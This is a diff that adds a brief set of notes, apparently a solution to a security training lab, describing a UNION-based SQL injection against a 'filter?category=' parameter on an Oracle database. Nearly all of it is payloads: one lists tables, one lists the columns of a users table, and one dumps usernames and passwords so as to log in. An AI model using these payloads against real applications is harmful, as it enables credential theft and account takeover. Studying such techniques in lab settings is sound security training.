@@ -1,0 +1,10 @@
+First find schema.
+filter?category=Lifestylem' UNION SELECT table_name,NULL FROM ALL_TABLES--
+
+Second get columns from users table
+filter?category=Lifestylem' UNION SELECT column_name,NULL FROM all_tab_cols WHERE table_name='USERS_RBIDTO'--
+
+Third get rows from users table.
+filter?category=Lifestylem' UNION SELECT USERNAME_WOZWVJ,PASSWORD_NPMCOX FROM USERS_RBIDTO--
+
+And Login.
